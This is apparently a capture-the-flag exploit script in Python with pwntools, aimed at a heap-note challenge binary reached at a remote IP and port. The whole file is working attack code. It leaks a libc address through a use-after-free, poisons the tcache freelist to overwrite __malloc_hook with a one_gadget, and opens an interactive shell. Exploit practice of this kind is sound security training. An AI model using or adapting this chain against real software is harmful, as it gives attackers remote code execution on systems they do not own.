from pwn import *
import binascii
#p = process('./task2')
p=remote('40.71.72.198',1235)
elf = ELF('./task2')
libc = ELF('libc-2.27.so')
'''
b*0x0000555555554dc7 free
'''
#raw_input("DEBUG")
def add(index,size,data):
	p.sendlineafter(">> ","1")
	p.sendlineafter("index : \n",str(index))
	p.sendlineafter("size : \n",str(size))
	p.sendlineafter("content : \n",str(data))
	log.info("Add success "+str(index))


def delete(index):
	p.sendlineafter(">> ","2")
	p.sendlineafter("index : \n",str(index))
	log.info("Delete success "+str(index))

def edit(index,data):
	p.sendlineafter(">> ","3")
	p.sendlineafter("index : \n",str(index))
	p.sendlineafter("content : \n",str(data))
	log.info("Edit success "+str(index))

def view(index):
	p.sendlineafter(">> ","4")
	p.sendlineafter("index : \n",str(index))


for i in range(0,9):
	add(i,0x88,"a"*0x88)

for i in range(0,7):
	delete(i)

delete(7)

view(7)
p.recvuntil('>> ')
leak = u64(p.recv(6)+"\x00"*2)
print "leak: ",hex(leak)
base = leak - 0x70 - libc.symbols['__malloc_hook']
print "base: ",hex(base)
#0x4f3d5 0x4f432 0x10a41c
one = base + 0x4f432
print "one: ",hex(one)
malloc_hook = base+libc.symbols['__malloc_hook']
print "malloc_hook: ",hex(malloc_hook)

malloc = str(hex(malloc_hook)[2:])
malloc_6bytes = binascii.unhexlify(malloc)[::-1]

one_g = str(hex(one)[2:])
one_6bytes = binascii.unhexlify(one_g)[::-1]

edit(6,malloc_6bytes)
add(9,0x88,"a"*10)
add(10,0x88,one_6bytes)

p.sendlineafter(">> ","1")
p.sendlineafter("index : \n","11")
p.sendlineafter("size : \n","100")


p.interactive()